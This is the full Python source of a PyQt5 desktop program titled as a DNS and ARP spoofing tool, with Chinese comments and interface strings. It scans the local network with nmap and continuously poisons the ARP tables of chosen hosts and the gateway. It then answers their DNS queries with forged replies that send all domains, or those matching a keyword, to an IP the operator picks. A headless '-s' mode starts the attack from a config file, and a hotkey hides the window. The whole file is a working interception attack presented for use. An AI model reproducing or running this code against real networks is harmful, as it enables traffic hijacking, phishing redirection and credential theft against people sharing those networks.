import os
import sys
import socket  # 确保socket导入
import locale
import configparser
import subprocess
import threading
import time
from datetime import datetime

import keyboard
import nmap
import webbrowser
import concurrent.futures

from PyQt5 import QtCore, QtWidgets
from PyQt5.QtGui import QIcon
from PyQt5.QtWidgets import (
    QComboBox, QLineEdit, QListWidget, QMenu,
    QPushButton, QVBoxLayout, QWidget, QMessageBox
)

# ---------- 无缓冲输出设置 ----------
class Unbuffered:
    def __init__(self, stream):
        self.stream = stream

    def write(self, data):
        self.stream.write(data)
        self.stream.flush()

    def writelines(self, datas):
        self.stream.writelines(datas)
        self.stream.flush()

    def flush(self):
        self.stream.flush()

encoding = locale.getpreferredencoding()
sys.stdout = Unbuffered(sys.stdout)
sys.stderr = Unbuffered(sys.stderr)

# ---------- 全局常量/变量 ----------
CONFIG_FILE = "dns.ini"
CONFIG_SECTION = "dnsconfig"

redirect_ip = ""
attacking = False
scanning = False
hijack_keyword = ""

# ========== 配置管理相关函数 ==========

def ensure_config_exists():
    """若dns.ini不存在，则创建默认dns.ini。"""
    if not os.path.exists(CONFIG_FILE):
        config = configparser.ConfigParser()
        config.add_section(CONFIG_SECTION)
        config.set(CONFIG_SECTION, "redirect_ip", "")
        config.set(CONFIG_SECTION, "hijack_keyword", "")
        config.set(CONFIG_SECTION, "manual_ips", "")
        config.set(CONFIG_SECTION, "interface", "")  # 新增：存储网口信息
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            config.write(f)
        print(f"已创建默认配置文件: {CONFIG_FILE}")

def load_config():
    """读取dns.ini配置并返回字典形式的配置值。"""
    config = configparser.ConfigParser()
    config.read(CONFIG_FILE, encoding='utf-8')
    if CONFIG_SECTION not in config.sections():
        return {}
    cfg_dict = {
        "redirect_ip": config.get(CONFIG_SECTION, "redirect_ip", fallback=""),
        "hijack_keyword": config.get(CONFIG_SECTION, "hijack_keyword", fallback=""),
        "manual_ips": config.get(CONFIG_SECTION, "manual_ips", fallback=""),
        "interface": config.get(CONFIG_SECTION, "interface", fallback=""),  # 新增
    }
    return cfg_dict

def save_config(redirect_ip_value, hijack_keyword_value, manual_ips_value, interface_value):
    """将当前程序配置写入dns.ini。"""
    config = configparser.ConfigParser()
    if os.path.exists(CONFIG_FILE):
        config.read(CONFIG_FILE, encoding='utf-8')
    if CONFIG_SECTION not in config.sections():
        config.add_section(CONFIG_SECTION)

    config.set(CONFIG_SECTION, "redirect_ip", redirect_ip_value)
    config.set(CONFIG_SECTION, "hijack_keyword", hijack_keyword_value)
    config.set(CONFIG_SECTION, "manual_ips", manual_ips_value)
    config.set(CONFIG_SECTION, "interface", interface_value)  # 写入网口信息

    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
        config.write(f)
    print(f"配置信息已保存到 {CONFIG_FILE}")

# ========== Nmap检测与警告 ==========

def check_nmap():
    try:
        subprocess.run(['nmap', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except FileNotFoundError:
        return False

def show_warning():
    app = QtWidgets.QApplication(sys.argv)
    result = QtWidgets.QMessageBox.warning(
        None,
        "错误",
        "未检测到Nmap，是否跳转到nmap下载地址，请下载nmap-7.95-setup.exe",
        QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No,
        QtWidgets.QMessageBox.Yes
    )
    if result == QtWidgets.QMessageBox.Yes:
        webbrowser.open("https://nmap.org/download.html#windows")
    sys.exit()

# ========== 资源路径处理 ==========

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath("./build")
    return os.path.join(base_path, relative_path)

icon_path = resource_path('9k1xp-9nxcx-001.ico')

# ========== 网络与攻击相关函数 ==========

def get_gateway_ip_now_192():
    """获得真实局域网IP. 解决UnboundLocalError问题."""
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        return s.getsockname()[0]
    except Exception as e:
        print(f"获取真实局域网IP时出现异常: {e}")
        return None
    finally:
        if s:
            s.close()

def get_gateway_ip(iface):
    """根据指定接口获取网关IP地址."""
    s2 = None
    try:
        from scapy.all import get_if_addr
        iface_ip = get_if_addr(iface)
        s2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s2.connect(('8.8.8.8', 80))
        return iface_ip
    finally:
        if s2:
            s2.close()

def get_gateway_ip_from_arp(iface):
    """获取指定接口的网关 IP 地址。使用Windows 'route print' 命令。"""
    try:
        from scapy.all import get_if_addr
        iface_ip = get_if_addr(iface)
        result = subprocess.run(['route', 'print'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = result.stdout.decode('latin-1')
        gateway = None
        for line in output.split('\n'):
            if '0.0.0.0' in line and iface_ip in line:
                parts = line.split()
                if len(parts) > 2:
                    gateway = parts[2]
                    break
        return gateway
    except Exception as e:
        print(f"获取网关时出错: {e}", flush=True)
        return None

def get_mac_address(ip_address, iface):
    try:
        from scapy.all import ARP, Ether, srp, get_if_hwaddr
        arp_request = ARP(pdst=ip_address)
        ether = Ether(src=get_if_hwaddr(iface), dst='ff:ff:ff:ff:ff:ff')
        packet = ether / arp_request
        answered_list = srp(packet, iface=iface, timeout=2, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        return None
    except Exception as e:
        print(f"获取MAC地址时出错: {e}", flush=True)
        return None

import nmap
def scan_network(network):
    """使用nmap扫描网络中的活跃IP。(只做ping扫描 -sn)"""
    return_list = []
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=network, arguments="-T4 -n -sn")
    except Exception as e:
        print(f"nmap扫描时出错: {e}", flush=True)
        return return_list

    for host in nm.all_hosts():
        if nm[host].state() == "up" and "mac" in nm[host]['addresses']:
            try:
                mac_address = nm[host]['addresses']['mac']
                manufacturer = "Unknown"
                return_list.append([nm[host]['addresses']['ipv4'], f"{mac_address} ({manufacturer})"])
            except KeyError:
                pass
    return return_list

import concurrent.futures
dns_thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=100)

def dns_spoof(pkt):
    global redirect_ip, hijack_keyword
    try:
        from scapy.all import DNS, IP, UDP
        if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
            queried_domain = pkt[DNS].qd.qname.decode("utf-8").rstrip('.')
            source_ip = pkt[IP].src
            destination_ip = pkt[IP].dst
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            should_hijack = False
            if hijack_keyword:
                if hijack_keyword.lower() in queried_domain.lower():
                    should_hijack = True
            else:
                should_hijack = True

            print(f"[{current_time}] 捕获到DNS查询: {queried_domain} 来自 {source_ip}", flush=True, end='')
            if should_hijack:
                print(f", 重定向到 {redirect_ip}", flush=True)
                dns_thread_pool.submit(
                    handle_dns_response,
                    pkt, queried_domain, source_ip, destination_ip, redirect_ip, current_time
                )
            else:
                print("", flush=True)
    except Exception as e:
        print(f"处理DNS欺骗时出错: {e}", flush=True)

def handle_dns_response(pkt, queried_domain, source_ip, destination_ip, redirect_ip, current_time):
    try:
        from scapy.all import send, IP, UDP, DNS, DNSRR
        response = IP(src=destination_ip, dst=source_ip) / \
                   UDP(sport=53, dport=pkt[UDP].sport) / \
                   DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,
                       an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=redirect_ip, ttl=10))
        print(f"[{current_time}] 伪造DNS响应: {queried_domain} -> {redirect_ip}", flush=True)
        send(response, verbose=0)
    except Exception as e:
        print(f"发送伪造DNS响应时出错: {e}", flush=True)

def arp_attack(target_ips, my_mac, gateway_ip, gateway_mac, iface):
    global attacking
    from scapy.all import ARP, Ether, sendp
    while attacking:
        for target_ip in target_ips:
            try:
                packet_to_target = Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2, psrc=gateway_ip, hwsrc=my_mac, pdst=target_ip)
                sendp(packet_to_target, verbose=0, iface=iface)

                packet_to_gateway = Ether(src=my_mac, dst=gateway_mac) / ARP(
                    op=2, psrc=target_ip, hwsrc=my_mac, pdst=gateway_ip)
                sendp(packet_to_gateway, verbose=0, iface=iface)
            except Exception as e:
                print(f"发送ARP包时出错: {e}", flush=True)
        time.sleep(1)

# ========== 主界面类 ==========

class App(QWidget):
    scanning = True

    def __init__(self):
        super().__init__()
        self.initUI()

        # 读取当前选中的网口信息
        selected_iface_text = self.interface_select.currentText()
        iface = selected_iface_text.split(' (')[0]

        # 获取自身IP和网关IP
        from scapy.all import get_if_addr
        self.own_ip = get_if_addr(iface)
        self.gateway_ip = get_gateway_ip_from_arp(iface)

        self.redirect_ip_input.setText("")
        self.interface = None
        self.target_ips = []
        self.sniff_thread = None

        keyboard.add_hotkey('ctrl+p', self.toggle_visibility)

    def initUI(self):
        self.setWindowTitle('DNS & ARP 欺骗工具 - By 老铁 - 版本：2.0 ------ 内部使用，严禁外传。')
        self.setWindowIcon(QIcon(icon_path))
        self.layout = QVBoxLayout()

        # 接口选择下拉
        self.interface_select = QComboBox(self)
        self.populate_interfaces()
        self.layout.addWidget(self.interface_select)

        # 重定向IP
        self.redirect_ip_input = QLineEdit(self)
        self.redirect_ip_input.setPlaceholderText("输入重定向IP地址")
        self.layout.addWidget(self.redirect_ip_input)

        # 关键词
        self.keyword_input = QLineEdit(self)
        self.keyword_input.setPlaceholderText("请输入指定域名或关键词，不输入则劫持所有。")
        self.layout.addWidget(self.keyword_input)

        # 目标IP列表
        self.target_ip_list = QListWidget()
        self.target_ip_list.setSelectionMode(QListWidget.MultiSelection)
        self.layout.addWidget(self.target_ip_list)

        # 手动输入目标IP
        self.manual_ip_input = QLineEdit(self)
        self.manual_ip_input.setPlaceholderText("手动输入目标IP，用逗号分隔")
        self.manual_ip_input.setFixedHeight(30)
        self.layout.addWidget(self.manual_ip_input)

        # 扫描按钮
        self.scan_button = QPushButton('扫描网络')
        self.scan_button.clicked.connect(self.scan_network)
        self.layout.addWidget(self.scan_button)

        # 开始攻击按钮
        self.start_button = QPushButton('开始攻击')
        self.start_button.clicked.connect(self.start_attack)
        self.layout.addWidget(self.start_button)

        self.setLayout(self.layout)

        # 右键菜单
        self.target_ip_list.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.target_ip_list.customContextMenuRequested.connect(self.open_context_menu)
        self.target_ip_list.itemDoubleClicked.connect(self.on_item_double_clicked)

    # ---------- 读取/写入配置的方法 ----------

    def load_from_config(self, cfg):
        """从配置字典中加载配置到界面."""
        if not cfg:
            return
        self.redirect_ip_input.setText(cfg.get("redirect_ip", ""))
        self.keyword_input.setText(cfg.get("hijack_keyword", ""))
        self.manual_ip_input.setText(cfg.get("manual_ips", ""))

        interface_val = cfg.get("interface", "")
        if interface_val:
            index = self.interface_select.findText(interface_val)
            if index >= 0:
                self.interface_select.setCurrentIndex(index)
            else:
                # 如果找不到匹配项，也可以添加条目或忽略
                pass

    def save_to_config(self):
        """从界面获取配置并写入dns.ini."""
        redirect_val = self.redirect_ip_input.text().strip()
        keyword_val = self.keyword_input.text().strip()
        manual_val = self.manual_ip_input.text().strip()
        # 获取当前下拉框选中的网口完整字符串
        interface_val = self.interface_select.currentText()

        save_config(redirect_val, keyword_val, manual_val, interface_val)

    # ----------------------------------------

    def toggle_visibility(self):
        if self.isVisible():
            self.hide()
        else:
            self.show()

    def populate_interfaces(self):
        from scapy.all import get_if_list, get_if_hwaddr, get_if_addr
        interfaces = get_if_list()
        if interfaces:
            gw_ip = get_gateway_ip_now_192()
            for iface in interfaces:
                try:
                    mac = get_if_hwaddr(iface)
                    ip = get_if_addr(iface)
                    if ip != "0.0.0.0":
                        item_text = f"{iface} (MAC: {mac}, IP: {ip})"
                        self.interface_select.addItem(item_text)
                        if ip == gw_ip:
                            self.interface_select.setCurrentText(item_text)
                except Exception as e:
                    print(f"无法获取 {iface} 的信息: {e}", flush=True)

    def on_item_double_clicked(self, item):
        ip_address = item.text().split(' - ')[0]
        self.add_ip_to_manual_input(ip_address)

    def add_ip_to_manual_input(self, ip_address):
        manual_input_text = self.manual_ip_input.text().strip()
        existing_ips = set(manual_input_text.split(', ')) if manual_input_text else set()
        existing_ips.add(ip_address)
        self.manual_ip_input.setText(', '.join(existing_ips))

    def open_context_menu(self, position):
        menu = QMenu()
        move_to_manual_ip_action = menu.addAction("移动到手动输入框")
        action = menu.exec_(self.target_ip_list.viewport().mapToGlobal(position))
        if action == move_to_manual_ip_action:
            self.move_selected_to_manual_ip_input()

    def move_selected_to_manual_ip_input(self):
        selected_items = self.target_ip_list.selectedItems()
        ip_addresses = [item.text().split(' - ')[0] for item in selected_items]
        if ip_addresses:
            manual_input_text = self.manual_ip_input.text().strip()
            existing_ips = set(manual_input_text.split(', ')) if manual_input_text else set()
            existing_ips.update(ip_addresses)
            self.manual_ip_input.setText(', '.join(existing_ips))

    def scan_network(self):
        global scanning
        if not scanning:
            print("正在扫描网络，请稍候...", flush=True)
            scanning = True
            self.scan_button.setText("停止扫描网络")
            self.scan_thread = threading.Thread(target=self.perform_network_scan)
            self.scan_thread.start()
        else:
            print("正在停止网络扫描...", flush=True)
            scanning = False
            if self.scan_thread.is_alive():
                self.scan_thread.join(timeout=1)
            self.scan_button.setText("扫描网络")

    def perform_network_scan(self):
        global scanning
        selected_iface_text = self.interface_select.currentText()
        # 例如 "以太网 (MAC: xx, IP: yy)"
        iface = selected_iface_text.split(' (')[0]

        gw_ip = get_gateway_ip(iface)
        if not gw_ip:
            print("无法获取接口的网关IP，扫描可能失败。", flush=True)
            return

        network = f"{gw_ip.rsplit('.', 1)[0]}.0/24"
        self.target_ip_list.clear()
        result_found = False

        while scanning:
            result = scan_network(network)
            if result and not result_found:
                # 过滤掉自身IP和网关IP
                from scapy.all import get_if_addr
                own_ip = get_if_addr(iface)
                gateway_ip_ = get_gateway_ip_from_arp(iface)
                filtered_result = [
                    ip_info for ip_info in result
                    if ip_info[0] not in (own_ip, gateway_ip_)
                ]
                if filtered_result:
                    print("扫描成功！", flush=True)
                    for ip_info in filtered_result:
                        self.target_ip_list.addItem(f"{ip_info[0]} - {ip_info[1]}")
                    ips_to_add = [ip_info[0] for ip_info in filtered_result]
                    self.manual_ip_input.setText(", ".join(ips_to_add))
                    result_found = True
                break
            time.sleep(1)

        print("网络扫描已停止。", flush=True)
        self.scan_button.setText("扫描网络")

    def start_attack(self):
        global attacking, hijack_keyword
        manual_ips = self.manual_ip_input.text().split(',')
        manual_ips = [ip.strip() for ip in manual_ips if ip.strip()]

        selected_ips = [item.text().split(' - ')[0] for item in self.target_ip_list.selectedItems()]
        self.target_ips = set(selected_ips + manual_ips)

        if not attacking:
            if not self.target_ips:
                print("没有提供任何目标 IP。空目标只会对主机造成影响", flush=True)
                QMessageBox.warning(self, "警告", "没有提供任何目标 IP。空目标只会对当前主机造成影响")

            # ---------- 在开始攻击之前，先把当前配置保存到dns.ini ----------
            self.save_to_config()
            # -----------------------------------------

            print("目标 IP:", ", ".join(self.target_ips), flush=True)
            selected_iface_text = self.interface_select.currentText()
            iface = selected_iface_text.split(' (')[0]

            gateway_ip = get_gateway_ip_from_arp(iface)
            if gateway_ip is None:
                print("无法获取网关 IP，请检查网络连接或接口设置。", flush=True)
                QMessageBox.warning(self, "警告", "无法获取网关 IP，请检查网络连接或接口设置。")
                return
            else:
                print("网关地址：", gateway_ip, flush=True)

            attacking = True
            self.start_button.setText("停止ARP攻击")

            global redirect_ip
            redirect_ip = self.redirect_ip_input.text().strip()
            hijack_keyword = self.keyword_input.text().strip()

            self.start_sniffing()

            self.attack_thread = threading.Thread(target=self.perform_attack)
            self.attack_thread.start()
            print("开始ARP攻击...", flush=True)
        else:
            print("停止ARP攻击...", flush=True)
            attacking = False
            self.start_button.setText("开始攻击")
            self.stop_sniffing()
            if hasattr(self, 'arp_thread') and self.arp_thread.is_alive():
                self.arp_thread.join(timeout=1)

    def perform_attack(self):
        global attacking
        selected_iface_text = self.interface_select.currentText()
        iface = selected_iface_text.split(' (')[0]

        from scapy.all import get_if_hwaddr
        my_mac = get_if_hwaddr(iface)

        gateway_ip = get_gateway_ip_from_arp(iface)
        if gateway_ip is None:
            print(f"获取网关 {gateway_ip} 的 MAC 地址失败。", flush=True)
            attacking = False
            self.start_button.setText("开始攻击")
            return

        gw_mac = get_mac_address(gateway_ip, iface)
        if gw_mac is None:
            print(f"获取网关 {gateway_ip} 的 MAC 地址失败。", flush=True)
            attacking = False
            self.start_button.setText("开始攻击")
            return

        self.arp_thread = threading.Thread(
            target=arp_attack,
            args=(list(self.target_ips), my_mac, gateway_ip, gw_mac, iface)
        )
        self.arp_thread.start()

    def start_sniffing(self):
        from scapy.all import AsyncSniffer
        try:
            self.sniffer = AsyncSniffer(filter="udp port 53", prn=dns_spoof, store=0)
            self.sniffer.start()
            print("正在监听DNS查询...", flush=True)
        except Exception as e:
            print(f"启动嗅探器时出错: {e}", flush=True)

    def stop_sniffing(self):
        if hasattr(self, 'sniffer') and self.sniffer and self.sniffer.running:
            try:
                self.sniffer.stop()
                print("已停止监听DNS查询。", flush=True)
            except Exception as e:
                print(f"停止嗅探时出错: {e}", flush=True)
        else:
            print("嗅探器未运行或未初始化。", flush=True)

    def closeEvent(self, event):
        global attacking, scanning
        attacking = False
        scanning = False
        if hasattr(self, 'arp_thread') and self.arp_thread.is_alive():
            self.arp_thread.join(timeout=1)
        if hasattr(self, 'sniffer') and self.sniffer and self.sniffer.running:
            self.sniffer.stop()
        dns_thread_pool.shutdown(wait=False)
        event.accept()

# ========== 主函数入口 ==========

def main():
    # 确保dns.ini存在，否则创建
    ensure_config_exists()

    # 解析命令行参数
    args = sys.argv[1:]
    silent_mode = ("-s" in args)

    # 检查nmap
    if not check_nmap():
        show_warning()

    if silent_mode:
        if not os.path.exists(CONFIG_FILE):
            print("不存在配置文件，请在程序中配置。")
            sys.exit(0)
        cfg = load_config()
        if not cfg:
            print("配置文件为空或无有效配置，请在程序中配置。")
            sys.exit(0)

        # 初始化Qt环境，但不展示UI
        app = QtWidgets.QApplication(sys.argv)
        ex = App()
        # 将配置加载到界面
        ex.load_from_config(cfg)

        manual_ips = cfg.get("manual_ips", "")
        if not manual_ips.strip():
            print("配置文件中无有效的manual_ips，请在程序中配置。")
            sys.exit(0)

        # 直接调用start_attack()
        ex.start_attack()
        sys.exit(app.exec_())
    else:
        # 正常模式
        app = QtWidgets.QApplication(sys.argv)
        ex = App()

        # 若配置文件有内容, 加载并应用
        cfg = load_config()
        if cfg:
            ex.load_from_config(cfg)

        ex.show()
        sys.exit(app.exec_())

if __name__ == '__main__':
    main()
